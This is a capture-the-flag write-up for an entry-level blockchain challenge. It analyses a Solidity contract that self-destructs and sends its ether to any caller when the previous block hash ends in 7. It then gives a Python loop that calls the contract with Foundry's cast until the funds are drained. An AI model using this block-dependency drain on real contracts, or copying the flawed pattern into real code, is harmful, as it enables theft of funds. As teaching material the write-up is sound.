# Synopsis

- This challenge serves as an entry-level warmup for the blockchain category. To solve it, players need to send a series of transactions until they get lucky.

## Description

- Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?

## Skills Required

- Smart contract interaction.


## Skills Learned

- Smart contract interaction.
- Block dependency.

## Analyzing the source code

Let's examine the provided source code.

**Setup.sol**
```solidity
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

This setup will deploy the challenge instance for us. It appears that a `TARGET` contract will be deployed with `10 ether` in it. To solve the challenge, the balance of that contract needs to be reduced to `0 ether` (by transferring the funds from a newly deployed contract).

**RussianRoulette.sol**
```solidity
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // ðŸ’€
        } else {
		return "im SAFU ... for now";
	    }
    }
}
```
The code we need to exploit is contained within the `pullTrigger()` function. This function will `selfdestruct()` to the interacting address (`msg.sender`) if certain conditions are met. Otherwise, it will return a string indicating that everything is [*"SAFU"*](https://www.google.com/search?&q=safu+meaning).

Let's delve into the functionality of `selfdestruct()`. According to the [Solidity 0.8.23 documentation](https://docs.soliditylang.org/en/v0.8.23/introduction-to-smart-contracts.html#deactivate-and-self-destruct), invoking the `selfdestruct` instruction will not only erase the code of the smart contract from the blockchain for subsequent blocks but will also **transfer all the Ether contained within it to a designated address**. In this context, the  specified address is `msg.sender`, which corresponds to the address initiating the transaction at that moment.

It's worth noting that starting from the Solidity 0.8.24, known as "Cancun" the  behavior of `selfdestruct` is going to change. Following this upgrade, invoking `selfdestruct` will no longer clear the contract code unless it's executed during the contract deployment transaction. You can read more about this update [here](https://twitter.com/solidity_lang/status/1750775408013046257).

Now that we understand how `selfdestruct()` operates in the specified version of Solidity, let's explore the conditions under which we could steal the funds from the contract.

```solidity
uint256(blockhash(block.number - 1)) % 10 == 7
```

This condition is critical to trigger. It involves fetching the hash of the preceding block, converting it to a `uint256` type (from `bytes32`), performing a modulo operation by 10, and checking if the remainder is 7. If this condition is met, the contract will undergo self-destruction, potentially leading to a windfall.

## Exploitation

## Finding the vulnerabity

As outlined in the Analysis section, our objective is to fulfill the following condition:

```solidity
uint256(blockhash(block.number - 1)) % 10 == 7
```

Luckily for us, simply calling the function repeatedly increases our  chances of achieving success in a relatively short amount of time. This phenomenon is known as a Block Dependency issue. However, it's worth noting that executing an unprotected `selfdestruct` based solely on random function calls isn't a prudent strategy in any case.

## Fetching the information

Upon launching the challenge, we will encounter two sockets. One socket serves as the challenge handler, while the other serves as the RPC endpoint. Upon connecting to the challenge handler, we will be presented with three options:

```shell
$ nc 0.0.0.0 1338
1 - Connection information
2 - Restart Instance
3 - Get flag
action?
```

Before proceeding, it's essential to launch the game instance, which will provide us with the necessary information to establish a connection.

```shell
$ nc 0.0.0.0 1338
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0x1e7ed27cf8804c820d69d04b69745634b54a989112752dd4ddd540e4dd6c1bc5
Address         :  0x18Bdd72777BccB5bCb5590bE6c947B68B38066c6
Target contract :  0x406607888e97f1f4F1cb225fC002DF46b50a85D0
Setup contract  :  0xC8333ab86099e2cDe792F81C4BA830CCb17D9B68
```

To connect to the blockchain, various tools are available, such as [web3.py](https://github.com/ethereum/web3.py), [cast](https://book.getfoundry.sh/cast/), and others. We will utilizei `cast` for the exploitation.

## Getting the flag

We can create a simple Python script to execute a `cast send` command repeatedly in the `pullTrigger()` function with addresses fetched from the netcat instance, testing our luck to see if we hit the jackpot.

```python
while True:
    # try luck
    system("cast send $TARGET 'pullTrigger()' --rpc-url $RPC_URL --private-key $PVK") 
    
    # get flag
    with remote("0.0.0.0", HANDLER_PORT) as p:
        p.recvuntil(b"action? ")
        p.sendline(b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
        break
```
